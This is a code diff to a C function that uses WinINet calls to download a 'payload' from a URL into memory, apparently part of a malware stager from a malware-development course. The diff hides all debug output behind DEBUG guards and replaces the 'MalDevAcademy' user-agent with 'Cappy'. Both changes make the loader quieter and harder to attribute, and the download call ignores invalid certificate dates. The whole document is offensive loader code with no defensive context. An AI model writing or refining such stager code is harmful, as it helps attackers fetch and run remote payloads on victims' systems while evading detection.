@@ -38,23 +38,35 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 
     
     // Opening the internet session handle, all arguments are NULL here since no proxy options are required
+#ifdef DEBUG
     PRINTA("opening a handle to the internet session...\n");
-    hInternet = InternetOpenW(L"MalDevAcademy", 0, NULL, NULL, 0);
+#endif
+    hInternet = InternetOpenW(L"Cappy", 0, NULL, NULL, 0);
     if (hInternet == NULL) {
+#ifdef DEBUG
         PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+#endif
         bSTATE = FALSE; goto _EndOfFunction;
     }
+#ifdef DEBUG
     PRINTA("got a handle!\n");
+#endif
 
 
     // Opening the handle to the payload using the payload's URL
+#ifdef DEBUG
     PRINTA("getting the handle to the payload...\n");
+#endif
     hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
     if (hInternetFile == NULL) {
+#ifdef DEBUG
         PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+#endif
         bSTATE = FALSE; goto _EndOfFunction;
     }
+#ifdef DEBUG
     PRINTA("got a handle!\n");
+#endif
 
 
     // Allocating 1024 bytes to the temp buffer
@@ -67,7 +79,9 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
 
         // Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
         if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+#ifdef DEBUG
             PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+#endif
             bSTATE = FALSE; goto _EndOfFunction;
         }
 
@@ -111,8 +125,9 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize
     *pPayloadBytes = pBytes;
     *sPayloadSize = sSize;
 
-
+#ifdef DEBUG
     PRINTA("\t[i] Bytes: [0x%p]\n", pBytes);
+#endif
 
 
 _EndOfFunction:
